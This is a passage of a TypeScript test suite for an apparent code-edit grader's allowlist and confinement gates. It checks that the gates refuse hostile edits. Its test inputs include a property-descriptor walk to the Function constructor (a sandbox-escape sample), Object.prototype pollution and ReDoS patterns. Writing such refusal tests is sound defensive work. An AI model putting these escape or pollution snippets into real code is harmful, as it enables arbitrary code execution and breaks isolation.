    t + "\nDate.now();\n",
  ]) { assert.notEqual(bad, t); assert.equal(gradedTestCalls(p, bad, "src/storage.ts"), null); }
  const rd = (q: string) => FILES.find((f) => f.path === q)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, e.content, p, t + "\nDate.now();\n", rd), "edit_test_shape");
  // a second unit changed (here the other method) is not a confined edit
  const two = e.content.replace("return this.client.list(\"cache/\");\n  }\n}", "return this.client.list(\"x/\");\n  }\n}");
  assert.notEqual(two, e.content);
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, two), null);
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, two, p, t, rd), "edit_not_confined");
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, STORAGE.replace("export interface Client", "export interface Client2")), null);
  // the graded edit itself must stay hermetic on the real tree
  const leaky = e.content.replace("const size = (await this.client.head(key))?.size ?? 0;", "const size = Date.now();");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, leaky, p, t, rd), "edit_not_allowlisted:ref:Date");
});

test("Job B code: gradeExistingEdit runs before gradeSelf, needs 1 source + 1 test, re-checks, runs every env pair, needs assertion-only failure on the base", () => {
  const src = read("peaceai/bin/test-candidates.ts");
  const i = src.indexOf("candidate.transformations.includes(\"LEARNED_EXISTING_EDIT\")"), j = src.indexOf("else if (candidate.selfGrade)");
  assert.ok(i > 0 && j > i, "the EXISTING_EDIT branch precedes the generic self-grade branch");
  const fnBody = (name: string): string => { const fn = src.slice(src.indexOf(`function ${name}(`)); return fn.slice(0, fn.indexOf("\n}\n")); };
  const body = fnBody("gradeExistingEdit"), stat = fnBody("existingEditStatic");
  for (const needle of ["existingEditStatic(", "EXISTING_EDIT_ENV_RUNS", "assertionFailuresOnly("]) assert.ok(body.includes(needle), needle);
  for (const needle of ["gradeExistingEditProblem(", "existingEditReads(", "isExcludedSource("]) assert.ok(stat.includes(needle), needle);
  assert.deepEqual(EXISTING_EDIT_ENV_RUNS.map((x) => x.TZ), ["UTC", "America/Denver", "Asia/Tokyo"]);
  assert.ok(EXISTING_EDIT_ENV_RUNS.every((x) => x.LANG === x.LC_ALL));
});

test("Auditor #489: grading never runs an EXISTING_EDIT splice unconfined — static gate before any run, original suite + new test under --permission", () => {
  const src = read("peaceai/bin/test-candidates.ts");
  const loop = src.slice(src.indexOf("for (const candidate of selected) {"));
  const gate = loop.indexOf("existingEditStatic(tree, files, newTests)"), tc = loop.indexOf("result.typecheckPassed = runCandidate(");
  const p1 = loop.indexOf("result.originalSuitePassed = m98"), p2 = loop.indexOf("else if (m98) {");
  assert.ok(gate > 0 && gate < tc && tc < p1 && p1 < p2, "static gate precedes typecheck and every execution pass");
  assert.match(loop.slice(gate, tc), /continue;/, "a refused edit is never run");
  // pass 1 for M98: confined only; an unconfinable related test is never run on the edit, and (W619) with any of them the
  // candidate fails closed unless MIN_CONFINED_JUDGED confined tests judge it (never falls back to unconfined)
  const pass1 = loop.slice(p1, loop.indexOf(";\n", p1));
  assert.match(pass1, /: m98Judgeable && judged\.every\(\(path\) => runConfinedSuite\(/);
  assert.match(loop, /const m98Judgeable = m98Unconfinable === 0 \|\| judged\.length >= MIN_CONFINED_JUDGED;/);
  assert.match(src, /const MIN_CONFINED_JUDGED = 2;/);
  assert.ok(pass1.indexOf("runConfinedSuite(") > 0 && pass1.indexOf("runConfinedSuite(") < pass1.indexOf(": targetConfig.originalSuite"), "M98 branch uses runConfinedSuite");
  assert.match(loop, /if \(m98\) \{\s*for \(const path of related\) \{\s*if \(judged\.length >= RELATED_LIMIT\) break;\s*probed\+\+;\s*if \(runConfinedSuite\(tree, \[path\], RELATED_TIMEOUT_MS\)\) judged\.push\(path\);/);
  assert.match(loop, /const m98Unconfinable = m98 && targetConfig\.originalSuite === "related" \? probed - judged\.length : 0;/);
  const rc = src.slice(src.indexOf("function runConfinedSuite("));
  const rcBody = rc.slice(0, rc.indexOf("\n}\n"));
  assert.match(rcBody, /"--permission"/);
  for (const banned of ["--allow-child-process", "--allow-addons", "--allow-wasi", "\"--test\""]) assert.ok(!rcBody.includes(banned), banned);
  assert.ok(!/allow-fs-write=\$\{(?:realTree|tree|modules)/.test(rcBody), "no write grant on the tree or node_modules");
});

test("grammar units: statement parse, unique split, token match, nested-function exclusion", () => {
  assert.equal(parseStatements("a(); // b"), null);
  assert.equal(parseStatements("a();\nb();"), null);
  assert.equal(parseStatements("const a = 1; return a;")!.length, 2);
  assert.deepEqual(splitBody("x = f(\"a with b\"); with x = 2;"), { oldText: "x = f(\"a with b\");", newText: "x = 2;" });
  assert.deepEqual(codeTokens("a ( b ) ;"), ["a", "(", "b", ")"]);
  assert.equal(newGrammarProblem(parseStatements("for (const x of [1, 2]) { f(x); }")!, false), null);
  assert.notEqual(newGrammarProblem(parseStatements("for (let i = 0; i < 2; i++) f(i);")!, false), null);
  assert.notEqual(newGrammarProblem(parseStatements("await f();")!, false), null, "await outside an async target");
  assert.equal(editStatement("src/misc.ts", MISC, "total", "const n = id.length;", "const n = 2;"), null);
  assert.ok(editStatement("src/misc.ts", MISC, "other", "return x + 1;", "return x + 2;"));
});

// ---- mined evidence ----
type Pin = { repo: string; commit: string; path: string; fileBlob: string; sha256: string; fixture: string };
const EV = JSON.parse(read("peaceai/rules/proposals/m98-existing-function-edit-evidence.json")) as {
  bar: number; manifestSha256: string; peace: { repo: string; checkedAt: string; counted: number }[];
  g1: { repo: string; commit: string; parent: string; path: string; target: string; old: string; new: string; before: Pin; after: Pin; license: string; licenseSha256: string }[];
  g2: { repo: string; commit: string; module: string; target: string; entry: { kind: "new" | "call"; cls?: string; method?: string; fn?: string; args: unknown[]; ctorArgs?: unknown[] }; test: Pin; snippet: string; closure: Pin[]; license: string; licenseSha256: string }[];
};
const gitBlob = (b: Buffer) => createHash("sha1").update(`blob ${b.length}\0`).update(b).digest("hex");
const pinned = (p: { fixture: string; fileBlob: string; sha256: string }) => {
  const b = readFileSync(resolve(root, p.fixture));
  assert.ok(b.length <= 65536, p.fixture);
  assert.equal(gitBlob(b), p.fileBlob, p.fixture);
  assert.equal(createHash("sha256").update(b).digest("hex"), p.sha256, p.fixture);
  return b.toString("utf8");
};
const inj = (a: unknown) => (a && typeof a === "object" ? { keys: new Set((a as { keys: string[] }).keys) } : a) as never;

test("evidence G1: >= 10 upstream commits replay exactly: editStatement on the parent reproduces the child's code tokens", () => {
  assert.ok(EV.g1.length >= EV.bar && EV.bar >= 10);
  assert.ok(new Set(EV.g1.map((e) => e.repo)).size >= 10);
  for (const e of EV.g1) {
    const before = pinned(e.before), after = pinned(e.after);
    assert.equal(e.before.commit, e.parent);
    assert.equal(e.after.commit, e.commit);
    // the task phrasing "replace statement OLD with NEW" splits back into exactly this OLD and NEW
    assert.deepEqual(splitBody(`${e.old} with ${e.new}`), { oldText: e.old, newText: e.new }, `${e.repo} ${e.target} split`);
    const r = editStatement(e.path, before, e.target, e.old, e.new);
    assert.ok(r, `${e.repo} ${e.target}`);
    assert.deepEqual(codeTokens(r.content), codeTokens(after), `${e.repo} ${e.target}`);
  }
  assert.ok(EV.g1.filter((e) => e.target.includes(".")).length >= 5, "class methods are evidenced");
});

test("evidence G2: >= 10 upstream tests drive a method / function with injected object-literal fakes; the hermetic walk accepts that shape on the pinned closure", () => {
  assert.ok(EV.g2.length >= EV.bar);
  assert.ok(new Set(EV.g2.map((e) => e.repo)).size >= 10);
  const STRICT_LOAD_REFUSED: Record<string, string> = { "pete-mc/dataverse-powertools": "src/general/dataverse/webApi.ts" };
  const accepted = new Set<string>();
  for (const e of EV.g2) {
    const test = pinned(e.test);
    assert.ok(test.includes(e.snippet.split("\n")[0]!), `${e.repo} snippet`);
    const files = new Map(e.closure.map((p) => [p.path, pinned(p)]));
    const rd = (p: string) => files.get(p) ?? null;
    const entry = e.entry.kind === "new" ? { kind: "new" as const, cls: e.entry.cls!, method: e.entry.method!, args: e.entry.args.map(inj), ctorArgs: e.entry.ctorArgs!.map(inj) } : { kind: "call" as const, fn: e.entry.fn!, args: e.entry.args.map(inj) };
    assert.ok([...e.entry.args, ...(e.entry.ctorArgs ?? [])].some((a) => a && typeof a === "object"), `${e.repo} injects an object literal`);
    const r = hermeticProblem(e.module, rd, [{ entry, code: "", names: [entry.kind === "new" ? entry.cls : entry.fn] }], e.target);
    // Auditor #520: the strict inert-at-load allowlist (importTimeProblem) now refuses this closure, whose webApi.ts
    // runs `"/".charCodeAt(0)` at import (a method call; fail closed). Recorded here, not counted; the bar still holds.
    if (STRICT_LOAD_REFUSED[e.repo]) { assert.equal(r, `edit_module_load:${STRICT_LOAD_REFUSED[e.repo]}`, e.repo); continue; }
    accepted.add(e.repo);
    assert.deepEqual(r, { targetReached: true }, `${e.repo} ${e.target}`);
  }
  assert.ok(accepted.size >= EV.bar, `${accepted.size} accepted`);
});

test("evidence: licenses by hash in THIRD_PARTY_NOTICES; fixtures dir holds exactly the evidence fixtures", () => {
  const notices = read("THIRD_PARTY_NOTICES");
  const listed = new Set<string>();
  for (const e of [...EV.g1, ...EV.g2]) {
    assert.ok(["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC"].includes(e.license), e.repo);
    assert.ok(notices.includes(`repo: ${e.repo}\nlicense: ${e.license} (`) && notices.includes(`sha256 of trimmed text ${e.licenseSha256})`), e.repo);
    const pins = "before" in e ? [e.before, e.after] : [e.test, ...e.closure];
    for (const p of pins) { assert.ok(notices.includes(` ${p.fixture}\n`), p.fixture); listed.add(p.fixture.split("/").pop()!); }
  }
  const have = readdirSync(resolve(root, "peaceai/test/fixtures/m98-ee"));
  for (const f of have) assert.ok(listed.has(f), f);
  assert.equal(have.length, listed.size);
});

test("evidence: no overlap with the training corpus or the ext-manifest; Peace's repos checked first and not counted; proposal record agrees", () => {
  const buf = readManifestBytes(resolve(root, "peaceai/model"), "ext-manifest");
  assert.equal(createHash("sha256").update(buf).digest("hex"), EV.manifestSha256);
  const repos = new Set<string>(); const shas = new Set<string>();
  for (const l of buf.toString("utf8").split("\n")) if (l.trim()) { const r = JSON.parse(l) as { repo?: string; sha256?: string }; if (r.repo) repos.add(r.repo); if (r.sha256) shas.add(r.sha256); }
  for (const r of (JSON.parse(read("peaceai/model/ext-corpus.json")) as { repos: { name: string }[] }).repos) repos.add(r.name);
  for (const e of [...EV.g1, ...EV.g2]) {
    assert.ok(!repos.has(e.repo), e.repo);
    assert.ok(!e.repo.startsWith("PeaceG03/"));
    const pins = "before" in e ? [e.before, e.after] : [e.test, ...e.closure];
    for (const p of pins) assert.ok(!shas.has(p.sha256), p.fixture);
  }
  for (const p of EV.peace) { assert.equal(p.counted, 0); assert.match(p.checkedAt, /^[0-9a-f]{40}$/); }
  const rec = JSON.parse(read("peaceai/rules/proposals/public-existing-function-edit-v1.json")) as { status: string; evidence: { g1: number; g2: number; repos: number; bar: number; qualifies: boolean } };
  assert.match(rec.status, /^proposal-off/);
  assert.equal(rec.evidence.g1, EV.g1.length);
  assert.equal(rec.evidence.g2, EV.g2.length);
  const all = [...new Set([...EV.g1, ...EV.g2].map((e) => e.repo))].sort();
  assert.equal(rec.evidence.repos, all.length);
  assert.ok(rec.evidence.qualifies && EV.g1.length >= rec.evidence.bar && EV.g2.length >= rec.evidence.bar);
  assert.deepEqual(SPEC.evidence.repos, all);
});

// Auditor #489 (review of 7508d20): the gates are an ALLOWLIST. X1 (descriptor-walk RCE, no banned word, no computed
// key) and X2 (Object.prototype pollution) are refused by Job A and Job B; every allowlist token has an input that
// trips it alone; the reach-walk guards (computed call, computed access, write root) each have an input that only that
// guard refuses (each verified by removing the guard: the input is then ACCEPTED by both jobs).
const AL_BASE = "export interface D { get?: number; a: number }\nexport function f(n: number, d: D): number {\n  return n + 1;\n}\n";
const alJobs = (base: string, nw: string, expect = "- expect f(1, { a: 1 }) returns 3"): [string, string] => {
  const a = analyzeSuppliedEdit(SPEC.trigger, SPEC.params, `in f in src/m.ts: replace statement return n + 1; with ${nw}\n${expect}`, [{ path: "src/m.ts", content: base }], isTest);
  const ok = analyzeSuppliedEdit(SPEC.trigger, SPEC.params, `in f in src/m.ts: replace statement return n + 1; with return n + 2;\n${expect}`, [{ path: "src/m.ts", content: base }], isTest);
  assert.ok(ok.edit, ok.reason ?? "");
  const ed = base.replace("return n + 1;", nw);
  const b = gradeExistingEditProblem("src/m.ts", base, ed, ok.edit.extra[0]!.path, ok.edit.extra[0]!.content, (q) => (q === "src/m.ts" ? ed : null));
  return [a.edit ? "ACCEPTED" : a.reason ?? "", b ?? "JOBB-OK"];
};

test("Auditor #489 X1/X2: the descriptor walk to Function and Object.prototype pollution are refused by Job A and Job B", () => {
  const X1 = "const V = Object.values(Object.getOwnPropertyDescriptors(Object)).map((d) => d.value).find((v) => typeof v === \"object\"); const A = Object.values(Object.getOwnPropertyDescriptors(V)).find((d) => d.get && d.set); const F = Object.values(Object.getOwnPropertyDescriptors(A.get.call(() => 0))).map((d) => d.value).find((v) => v && v.name === \"Function\"); return F(\"globalThis.__m98b = typeof process; return 1\")() ? n + 2 : n;";
  const X2 = "const V = Object.values(Object.getOwnPropertyDescriptors(Object)).map((d) => d.value).find((v) => typeof v === \"object\"); V.m98polluted = \"yes\"; return n + 2;";
  for (const x of [X1, X2]) assert.deepEqual(alJobs(AL_BASE, x), ["edit_not_allowlisted:member:getOwnPropertyDescriptors", "edit_not_allowlisted:member:getOwnPropertyDescriptors"]);
  // the later steps of each are refused on their own too (no single guard carries them)
  assert.deepEqual(alJobs(AL_BASE, "const V = d; V.a = 5; return n + 2;"), ["edit_not_allowlisted:write-nonfresh", "edit_not_allowlisted:write-nonfresh"]);
  assert.deepEqual(alJobs(AL_BASE, "const g = (x: number) => x + 2; return g.call(null, n);"), ["edit_not_allowlisted:member:call", "edit_not_allowlisted:member:call"]);
  assert.equal((globalThis as Record<string, unknown>).__m98b, undefined);
  assert.equal(({} as Record<string, unknown>).m98polluted, undefined);
});

test("Auditor #489 allowlist: each token is tripped alone by Job A and Job B; allowlisted shapes stay accepted", () => {
  const cases: [string, string][] = [
    ["const k = Object.getOwnPropertyNames(d); return n + 2;", "member:getOwnPropertyNames"],
    ["const k = Object.getOwnPropertyDescriptor(d, \"a\"); return n + 2;", "member:getOwnPropertyDescriptor"],
    ["const g = (x: number) => x + 2; const h = g.bind(null); return h(n);", "member:bind"],
    ["const e = {}; Error.captureStackTrace(e); return n + 2;", "member:captureStackTrace"],
    ["const g = d.get; return n + 2;", "accessor:get"],
    ["const m = new Map<string, number>(); const s = m.set; return n + 2;", "accessor:set"],
    ["const g = (x: number) => x + 2; return g.apply(null, [n]);", "member:apply"],
    ["const g = (x: number) => x + 2; return g.call(null, n);", "member:call"],
    ["const k = Object.getOwnPropertyDescriptors(d); return n + 2;", "member:getOwnPropertyDescriptors"],
    ["const e = Object.assign({}, d); return n + 2;", "gm:Object.assign"],
    ["const e = Object.fromEntries([[\"__proto__\", { z: 1 }]]); return n + 2;", "gm:Object.fromEntries"],
    ["const s = \"a\".repeat(n); return n + 2;", "size"],
    ["const s = \"a\".repeat(1e9); return n + 2;", "size"],
    ["const s = \"a\".padStart(1e9); return n + 2;", "size"],
    ["const s = Array(1e9); return n + 2;", "size"],
    ["const s = new Array(1e9); return n + 2;", "size"],
    ["const r = /a/; return n + 2;", "regex"],
    ["if (/(a+)+$/.test(String(n))) return 0; return n + 2;", "regex"],
    ["const r = new RegExp(\"a\"); return n + 2;", "ref:RegExp"],
    ["const t = Date.now(); return n + 2;", "ref:Date"],
    ["const g = (x: number) => x + 2; return g(n);", "call-local"],
    ["const V = d; V.a = 5; return n + 2;", "write-nonfresh"],
    ["const Math = 2; return n + Math;", "shadow"],
    ["const k = \"constructor\"; return n + 2;", "reflstr:constructor"],
  ];
  for (const [nw, tk] of cases) assert.deepEqual(alJobs(AL_BASE, nw), [`edit_not_allowlisted:${tk}`, `edit_not_allowlisted:${tk}`], nw);
  // growth loops: Job A refuses the loop grammar first; Job B (any edit grammar) refuses the self-growth itself
  for (const nw of ["let s = \"a\"; for (let i = 0; i < n; i++) s = s + s; return n + 2;", "const a = [1]; for (let i = 0; i < n; i++) a.push(...a); return n + 2;"])
    assert.deepEqual(alJobs(AL_BASE, nw), ["edit_new_grammar", "edit_not_allowlisted:size"], nw);
  // refused earlier by the capability tokens (no allowlist needed for these, but they must stay refused)
  for (const nw of ["const k = Reflect.ownKeys(d); return n + 2;", "const g = globalThis; return n + 2;", "const g = Function; return n + 2;", "const e = { __proto__: { z: 1 } }; return n + 2;"])
    assert.match(alJobs(AL_BASE, nw)[0], /^edit_new_capability:/, nw);
  for (const nw of ["return Math.max(n, 0) + 2;", "const r = { v: 0 }; r.v = n + 2; return r.v;", "const s = \"a\".repeat(3); return n + 2 + s.length - 3;", "return Number.isInteger(n) ? n + 2 : 0;", "const xs = [n, 2]; return xs.reduce((a, b) => a + b, 0);"])
    assert.deepEqual(alJobs(AL_BASE, nw), ["ACCEPTED", "JOBB-OK"], nw);
  // emitted tests: a __proto__ / reflection key in a fake or in data never parses
  for (const b of ["- fake o = { __proto__: { a: 1 } }\n- expect f(1, o) returns 3", "- expect f(1, { __proto__: { a: 1 } }) returns 3", "- expect f(1, { \"__proto__\": { a: 1 } }) returns 3", "- expect f(1, { constructor: 1 }) returns 3"])
    assert.equal(analyzeSuppliedEdit(SPEC.trigger, SPEC.params, `in f in src/m.ts: replace statement return n + 1; with return n + 2;\n${b}`, [{ path: "src/m.ts", content: AL_BASE }], isTest).reason, "edit_test_grammar", b);
});

test("Auditor #489 reach walk: computed call, computed access and a non-identifier write root are each refused alone (base code reached by a benign edit)", () => {
  const C: [string, string][] = [
    ["function h(o: Record<string, () => number>, k: string): number {\n  return o[k]();\n}\nexport function f(n: number): number {\n  h({ a: () => 1 }, \"a\");\n  return n + 1;\n}\n", "edit_computed_call"],
    ["function make(): Record<string, number> {\n  return { a: 1 };\n}\nexport function f(n: number): number {\n  const k = String(n);\n  const v = make()[k];\n  return n + 1;\n}\n", "edit_computed_access"],
    ["export function f(n: number): number {\n  ({ p: 1 }).p = 2;\n  return n + 1;\n}\n", "edit_global_write"],
  ];
  const clean = analyzeSuppliedEdit(SPEC.trigger, SPEC.params, "in f in src/m.ts: replace statement return n + 1; with return n + 2;\n- expect f(1) returns 3", [{ path: "src/m.ts", content: "export function f(n: number): number {\n  return n + 1;\n}\n" }], isTest);
  assert.ok(clean.edit, clean.reason ?? "");
  for (const [base, code] of C) {
    const r = analyzeSuppliedEdit(SPEC.trigger, SPEC.params, "in f in src/m.ts: replace statement return n + 1; with return n + 2;\n- expect f(1) returns 3", [{ path: "src/m.ts", content: base }], isTest);
    assert.equal(r.reason, code, base);
    const ed = base.replace("return n + 1;", "return n + 2;");
    assert.equal(gradeExistingEditProblem("src/m.ts", base, ed, clean.edit!.extra[0]!.path, clean.edit!.extra[0]!.content, (q) => (q === "src/m.ts" ? ed : null)), code, base);
  }
});

test("Auditor #489 reach walk: a write rooted at an undeclared name, an import binding or a namespace import is refused (Job A and Job B)", () => {
  // `!s || !d`: an undeclared root has no symbol (removing that guard crashes the walk on `s.flags`); the import-alias
  // guard is subsumed by the module-level-binding guard (an import is never inside a function), so it is pinned here
  // together with it: with both removed these writes are no longer refused as global writes.
  const B = "export const box = { v: 1 };\n";
  const C: [string, string, Record<string, string>][] = [
    ["undeclared", "export function f(n: number): number {\n  if (n < 0) zz9.x = 2;\n  return n + 1;\n}\n", {}],
    ["import", "import { box } from \"./b.ts\";\nexport function f(n: number): number {\n  if (n < 0) box.v = 2;\n  return n + 1;\n}\n", { "src/b.ts": B }],
    ["namespace import", "import * as b from \"./b.ts\";\nexport function f(n: number): number {\n  if (n < 0) b.box.v = 2;\n  return n + 1;\n}\n", { "src/b.ts": B }],
  ];
  const obj = "in f in src/m.ts: replace statement return n + 1; with return n + 2;\n- expect f(1) returns 3";
  const clean = analyzeSuppliedEdit(SPEC.trigger, SPEC.params, obj, [{ path: "src/m.ts", content: "export function f(n: number): number {\n  return n + 1;\n}\n" }], isTest);
  assert.ok(clean.edit, clean.reason ?? "");
  for (const [k, base, extra] of C) {
    const files = [{ path: "src/m.ts", content: base }, ...Object.entries(extra).map(([path, content]) => ({ path, content }))];
    assert.equal(analyzeSuppliedEdit(SPEC.trigger, SPEC.params, obj, files, isTest).reason, "edit_global_write", k);
    const ed = base.replace("return n + 1;", "return n + 2;");
    assert.equal(gradeExistingEditProblem("src/m.ts", base, ed, clean.edit!.extra[0]!.path, clean.edit!.extra[0]!.content, (q) => (q === "src/m.ts" ? ed : extra[q] ?? null)), "edit_global_write", k);
  }
});

// m98b (Auditor #489, non-blocking notes on 44db16a, fixed before the deriver is wired to this gate): in-place mutators
// on caller data, non-literal string patterns, and stack reads are allowlist tokens. Each case below trips its token
// ALONE in Job A (analyzeSuppliedEdit) and Job B (gradeExistingEditProblem); each guard was verified by removing it
// (the case is then accepted, or refused by a different token, so the test fails) and restoring it.
const MB_BASE = "export interface D { xs: number[]; s: string; b: Uint8Array; t: Date; a: number }\nexport function f(n: number, d: D): number {\n  return n + 1;\n}\n";
const MB_EXPECT = "- expect f(1, { xs: [1], s: \"a,b\", a: 1 }) returns 3";
const mbJobs = (nw: string): [string, string] => alJobs(MB_BASE, nw, MB_EXPECT);

test("m98b mutate: an in-place mutator on caller data is refused however written (comma, nested, ?., [\"m\"], reference, destructured, borrowed freshness)", () => {
  const cases: [string, string][] = [
    ["return (d.xs.push(1), n + 2);", "mutate:push"],
    ["return (d.xs.pop(), n + 2);", "mutate:pop"],
    ["return (d.xs.shift?.(), n + 2);", "mutate:shift"],
    ["return (0, (d.xs.unshift(9), n + 2));", "mutate:unshift"],
    ["const r = (d.xs?.splice(0, 1), n + 2); return r;", "mutate:splice"],
    ["return (d.xs.sort(), n + 2);", "mutate:sort"],
    ["return ((n, d.xs)[\"reverse\"](), n + 2);", "mutate:reverse"],
    ["return (d.b.fill(0), n + 2);", "mutate:fill"],
    ["return (d.xs.copyWithin(0, 1), n + 2);", "mutate:copyWithin"],
    ["return (d.b.set([1]), n + 2);", "mutate:set"],
    ["return (d.t.setTime(0), n + 2);", "mutate:setTime"],
    ["const ys = d.xs; return (ys.push(1), n + 2);", "mutate:push"],
    ["const w = [d.xs]; return (w[0]!.push(1), n + 2);", "mutate:push"],
    ["return ([1].forEach(d.xs.push, d.xs), n + 2);", "mutate:push"],
    ["const { push } = d.xs; return n + 2;", "mutate:push"],
    // a callback parameter can't borrow the freshness of a same-named const literal local
    ["[d.xs].map((a) => a.push(1)); const a = [1]; return n + 2;", "mutate:push"],
    ["[d].map((a) => { a.a = 0; }); const a = { a: 1 }; return n + 2;", "write-nonfresh"],
  ];
  for (const [nw, tk] of cases) assert.deepEqual(mbJobs(nw), [`edit_not_allowlisted:${tk}`, `edit_not_allowlisted:${tk}`], nw);
  // fresh containers the unit builds stay mutable; non-mutating copies stay allowed
  for (const nw of ["const a = [1]; a.push(n); return a.length + n + 1;", "const xs = [n, 2]; xs.sort(); return xs[0]! + 2;", "const m = new Map<string, number>(); m.set(\"a\", n); return (m.get(\"a\") ?? 0) + 2;", "const s = new Set<number>([n]); return s.size + n + 1;", "const ys = [...d.xs]; ys.reverse(); return n + 2;", "return (d.xs.toSorted(), n + 2);"])
    assert.deepEqual(mbJobs(nw), ["ACCEPTED", "JOBB-OK"], nw);
});

test("m98b pattern: match / matchAll / replace / replaceAll / split / search take only a literal pattern, called directly", () => {
  const cases: [string, string][] = [
    ["return d.s.split(d.s).length + n + 1;", "pattern:split"],
    ["return d.s.replace(d.s, \"x\").length + n + 1;", "pattern:replace"],
    ["return d.s.replaceAll(d.s, \"x\").length + n + 1;", "pattern:replaceAll"],
    ["return d.s.search(d.s) + n + 2;", "pattern:search"],
    ["return d.s.match(d.s) ? n + 2 : n;", "pattern:match"],
    ["return (d.s.matchAll(d.s), n + 2);", "pattern:matchAll"],
    ["const p = d.s + \"+\"; return (d.s?.split(p), n + 2);", "pattern:split"],
    ["return (d.s[\"split\"](d.s), n + 2);", "pattern:split"],
    ["return (d.s.split(), n + 2);", "pattern:split"],
    // match / matchAll / search build a RegExp from a string: a literal with regex metacharacters is a regex
    ["return d.s.match(\"(a+)+$\") ? n + 2 : n;", "pattern:match"],
    ["return d.s.search(\"a.\") + n + 2;", "pattern:search"],
    ["return (d.s.matchAll(\"a*\"), n + 2);", "pattern:matchAll"],
    // a non-call reference (a callback with a thisArg, or destructured) never has a checked pattern
    ["const sp = [d.s].map(d.s.split, \",\"); return n + 2;", "pattern:split"],
    ["const { replace } = d.s; return n + 2;", "pattern:replace"],
  ];
  for (const [nw, tk] of cases) assert.deepEqual(mbJobs(nw), [`edit_not_allowlisted:${tk}`, `edit_not_allowlisted:${tk}`], nw);
  for (const nw of ["return d.s.split(\",\").length + n + 1;", "return d.s.replace(\",\", \".*\").length + n + 1;", "return d.s.replaceAll(\"(a+)+$\", \"\").length + n + 1;", "return d.s.match(\"a\") ? n + 2 : n;", "return d.s.search(\"b\") + n + 3;"])
    assert.deepEqual(mbJobs(nw), ["ACCEPTED", "JOBB-OK"], nw);
  // a regex literal pattern stays the `regex` token
  assert.deepEqual(mbJobs("return (d.s.split(/,/), n + 2);"), ["edit_not_allowlisted:regex", "edit_not_allowlisted:regex"]);
});

test("m98b stack: no stack read on any receiver, however written", () => {
  const cases: [string, string][] = [
    ["const t = new Error().stack; return n + 2;", "member:stack"],
    ["try { throw new Error(\"x\"); } catch (e) { return e.stack ? n + 2 : n; }", "member:stack"],
    ["const e = new Error(\"x\"); return e[\"stack\"] ? n + 2 : n;", "member:stack"],
    ["const t = new Error()?.stack; return n + 2;", "member:stack"],
    ["const { stack } = new Error(); return n + 2;", "member:stack"],
    ["const { stack: t } = new Error(); return n + 2;", "member:stack"],
    ["let t: string | undefined = \"\"; ({ stack: t } = new Error()); return n + 2;", "member:stack"],
    ["let stack: string | undefined = \"\"; ({ stack } = new Error()); return n + 2;", "member:stack"],
    ["let t: string | undefined = \"\"; [{ stack: t }] = [new Error()]; return n + 2;", "member:stack"],
  ];
  for (const [nw, tk] of cases) assert.deepEqual(mbJobs(nw), [`edit_not_allowlisted:${tk}`, `edit_not_allowlisted:${tk}`], nw);
  assert.deepEqual(mbJobs("const e = new Error(\"x\"); return e.message.length + n + 1;"), ["ACCEPTED", "JOBB-OK"]);
});
